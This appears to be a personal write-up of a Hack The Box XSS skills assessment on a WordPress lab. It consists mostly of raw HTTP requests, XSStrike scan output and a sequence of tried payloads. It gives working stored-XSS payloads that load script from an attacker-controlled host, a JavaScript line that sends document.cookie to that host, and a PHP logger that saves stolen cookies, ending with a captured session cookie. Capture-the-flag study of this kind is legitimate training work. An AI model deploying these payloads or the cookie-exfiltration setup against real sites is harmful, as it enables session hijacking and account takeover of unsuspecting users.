# 08 skills assessement

## Identify a user-input field that is vulnerable to an XSS vulnerability

http://10.129.143.89/assessment/

POST /assessment/wp-comments-post.php HTTP/1.1 Host: 10.129.143.89 Content-Length: 92 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.129.143.89 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,_/_;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://10.129.143.89/assessment/index.php/2021/06/11/welcome-to-security-blog/ Accept-Encoding: gzip, deflate Accept-Language: en-GB,en-US;q=0.9,en;q=0.8 Connection: close

comment=a\&author=a\&email=aa.com\&url=a\&submit=Post+Comment\&comment\_post\_ID=8\&comment\_parent=0

Error: Please enter a valid email address.

POST /assessment/wp-comments-post.php HTTP/1.1 Host: 10.129.143.89 Content-Length: 99 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://10.129.143.89 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,_/_;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://10.129.143.89/assessment/index.php/2021/06/11/welcome-to-security-blog/ Accept-Encoding: gzip, deflate Accept-Language: en-GB,en-US;q=0.9,en;q=0.8 Connection: close

comment=a\&author=a\&email=aa%40toto.com\&url=a\&submit=Post+Comment\&comment\_post\_ID=8\&comment\_parent=0

git clone https://github.com/s0md3v/XSStrike.git cd XSStrike pip install -r requirements.txt python xsstrike.py

python xsstrike.py -u "http://10.129.143.89/assessment/index.php/2021/06/11/welcome-to-security-blog/?comment=a\&author=a\&email=aa%40toto.com\&url=a\&submit=Post+Comment\&comment\_post\_ID=8\&comment\_parent=0"

```
XSStrike v3.1.5
```

## \[\~] Checking for DOM vulnerabilities \[+] Potentially vulnerable objects found

2 ( Element.prototype.matches && Element.prototype.closest && window.NodeList && NodeList.prototype.forEach ) || document.write( '\</scr' + 'ipt>' );\
2   	/(trident|msie)/i.test(navigator.userAgent)&\&document.getElementById&\&window.addEventListener&\&window.addEventListener("hashchange",(function(){var t,e=location.hash.substring(1);/^\[A-z0-9\_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())}),!1);\[+] WAF Status: Offline \[!] Testing parameter: comment \[!] Reflections found: 1 \[~~] Analysing reflections \[~~] Generating payloads \[-] No vectors were crafted. \[!] Testing parameter: author \[-] No reflection found \[!] Testing parameter: email \[!] Reflections found: 1 \[~~] Analysing reflections \[~~] Generating payloads \[-] No vectors were crafted. \[!] Testing parameter: url \[!] Reflections found: 1 \[~~] Analysing reflections \[~~] Generating payloads \[-] No vectors were crafted. \[!] Testing parameter: submit \[!] Reflections found: 1 \[~~] Analysing reflections \[~~] Generating payloads \[-] No vectors were crafted. \[!] Testing parameter: comment\_post\_ID \[!] Reflections found: 1 \[~~] Analysing reflections \[~~] Generating payloads \[-] No vectors were crafted. \[!] Testing parameter: comment\_parent \[!] Reflections found: 1 \[~~] Analysing reflections \[~~] Generating payloads \[-] No vectors were crafted.python xsstrike.py -u "http://10.129.143.89/assessment/index.php/2021/06/11/welcome-to-security-blog/?comment=a"--> Failedpython xsstrike.py -u "http://10.129.143.89/assessment/?s=aa"XSStrike v3.1.5
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## \[\~] Checking for DOM vulnerabilities \[+] Potentially vulnerable objects found

2 ( Element.prototype.matches && Element.prototype.closest && window.NodeList && NodeList.prototype.forEach ) || document.write( '\</scr' + 'ipt>' );\
2   	/(trident|msie)/i.test(navigator.userAgent)&\&document.getElementById&\&window.addEventListener&\&window.addEventListener("hashchange",(function(){var t,e=location.hash.substring(1);/^\[A-z0-9\_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())}),!1);
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## \[+] WAF Status: Offline \[!] Testing parameter: s \[!] Reflections found: 6 \[~~] Analysing reflections \[~~] Generating payloads \[!] Payloads generated: 4608

\[+] Payload: \<d3v%0dOnpOInTeREnTeR%0a=%0aa=prompt,a()%0dx//v3dm0s \[!] Efficiency: 93 \[!] Confidence: 10

\--> failed

'>\<script src=http://10.10.15.46:8081/search>

\--> failed

">\<script src=http://10.10.15.46:8081/search>

\--> failed

javascript:eval('var a=document.createElement('script');a.src='http://10.10.15.46:8081/search';document.body.appendChild(a)')

\--> failed

function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.46:8081/search");a.send();

\--> failed

$.getScript("http://10.10.15.46:8081/search")

\--> failed

( Element.prototype.matches && Element.prototype.closest && window.NodeList && NodeList.prototype.forEach ) || document.write( '\</scr' + 'ipt>' );

\--> Failed

\<d3v%0dOnpOInTeREnTeR%0a=%0aa=%3Cscript%20src%3Dhttp%3A%2F%2F10.10.15.46%3A8081%2Fsearch%3E%3C%2Fscript%3E ,a()%0dx//v3dm0s

%3Cscript%20src%3Dhttp%3A%2F%2F10.10.15.46%3A8081%2Fsearch%3E%3C%2Fscript%3E

comment=a\&author=a\&email=aa%40toto.com\&url=a\&submit=Post+Comment\&comment\_post\_ID=8\&comment\_parent=0

">\<script src=http://10.10.15.46:8081/name>

\--> Failed

python xsstrike.py -u "http://10.129.143.89/assessment/index.php/2021/06/11/welcome-to-security-blog/" --data "website=a"

\--> Failed

">\<script src=http://10.10.15.46:8081/website>

\[Thu Dec 28 12:14:16 2023] PHP 7.4.33 Development Server (http://0.0.0.0:8081) started \[Thu Dec 28 12:36:05 2023] 10.129.143.89:33824 Accepted \[Thu Dec 28 12:36:05 2023] 10.129.143.89:33824 \[200]: GET /website \[Thu Dec 28 12:36:05 2023] 10.129.143.89:33824 Closing

website is the vulnerable parameter

## Find a working XSS payload that executes JavaScript code on the target's browser

On our web server :

mkdir /tmp/tmpserver cd /tmp/tmpserver vi script.js

new Image().src='http://10.10.15.46:8081/index.php?c='+document.cookie;

vi index.php

$value) { $cookie = urldecode($value); $file = fopen("cookies.txt", "a+"); fputs($file, "Victim IP: {$\_SERVER\['REMOTE\_ADDR']} | Cookie: {$cookie}\n"); fclose($file); } } ?>

sudo php -S 0.0.0.0:8081

## Using the Session Hijacking techniques, try to steal the victim's cookies, which should contain the flag

">\<script src=http://10.10.15.46:8081/script.js>

\[Thu Dec 28 12:39:42 2023] PHP 7.4.33 Development Server (http://0.0.0.0:8081) started \[Thu Dec 28 12:40:45 2023] 10.129.143.89:33922 Accepted \[Thu Dec 28 12:40:45 2023] 10.129.143.89:33922 \[200]: (null) /script.js \[Thu Dec 28 12:40:45 2023] 10.129.143.89:33922 Closing \[Thu Dec 28 12:40:45 2023] 10.129.143.89:33924 Accepted \[Thu Dec 28 12:40:45 2023] 10.129.143.89:33924 \[200]: GET /index.php?c=wordpress\_test\_cookie=WP%20Cookie%20check;%20wp-settings-time-2=1703767245;%20flag=HTB{cr055\_5173\_5cr1p71n6\_n1nj4} \[Thu Dec 28 12:40:45 2023] 10.129.143.89:33924 Closing
